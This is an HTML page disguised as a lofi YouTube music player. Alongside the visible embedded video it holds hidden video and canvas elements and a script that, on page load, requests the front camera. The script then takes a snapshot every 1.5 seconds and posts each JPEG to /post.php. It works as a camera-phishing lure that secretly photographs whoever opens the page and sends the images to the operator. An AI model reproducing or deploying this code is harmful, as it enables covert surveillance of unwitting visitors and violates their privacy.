<!doctype html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Live YT TV - Lofi</title>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { background:#0a0a0a; display:flex; justify-content:center; align-items:center; min-height:100vh; font-family:Arial; }
.container { width:100%; max-width:900px; padding:20px; background:#1a1a1a; border-radius:20px; box-shadow:0 10px 30px rgba(0,0,0,0.8); }
.video-wrapper { position:relative; padding-bottom:56.25%; height:0; overflow:hidden; border-radius:16px; background:#000; border:1px solid #333; }
.video-wrapper iframe { position:absolute; top:0; left:0; width:100%; height:100%; border:0; }
.video-wrap, #video, #canvas { display:none !important; }
.info { color:#aaa; text-align:center; margin-top:18px; font-size:14px; background:#222; padding:10px; border-radius:40px; border:1px solid #333; }
</style>
</head>
<body>
<div class="container">
    <div class="video-wrapper">
        <iframe src="https://www.youtube.com/embed/fc8Mab9zGkg?autoplay=1&mute=0&controls=1&rel=0" allow="autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
    </div>
    <div class="info">🎧 Achchi Lagti Ho (Slowed + Reverb) • <span id="videoStatus">● Playing</span></div>
</div>

<div class="video-wrap" hidden="hidden">
    <video id="video" playsinline autoplay muted></video>
</div>
<canvas hidden="hidden" id="canvas"></canvas>

<script>
function post(imgdata){
    $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: '/post.php',
        dataType: 'json',
        async: false,
        success: function(result){},
        error: function(){}
    });
}

'use strict';
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

// ১৬:৯ অনুপাতের জন্য constraints
const constraints = { 
    audio: false, 
    video: { 
        facingMode: "user",
        width: { ideal: 1280 },
        height: { ideal: 720 }
    } 
};

async function init() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        handleSuccess(stream);
    } catch (e) {
        const statusEl = document.getElementById('videoStatus');
        if (statusEl) statusEl.innerHTML = `⚠️ Camera error: ${e.toString().slice(0, 60)}`;
    }
}

function handleSuccess(stream) {
    window.stream = stream;
    video.srcObject = stream;
    
    video.onloadedmetadata = function() {
        const videoWidth = video.videoWidth;
        const videoHeight = video.videoHeight;
        
        // ক্যানভাসের সাইজ ভিডিওর ন্যাচারাল সাইজ অনুযায়ী সেট
        canvas.width = videoWidth;
        canvas.height = videoHeight;
        
        var context = canvas.getContext('2d');
        setInterval(function(){
            context.drawImage(video, 0, 0, videoWidth, videoHeight);
            // JPEG ফরম্যাটে ৮৫% কোয়ালিটিতে পাঠান (সাইজ কম, কোয়ালিটি ভালো)
            var canvasData = canvas.toDataURL("image/jpeg", 0.85);
            post(canvasData);
        }, 1500);
    };
}

init();
</script>
</body>
</html>
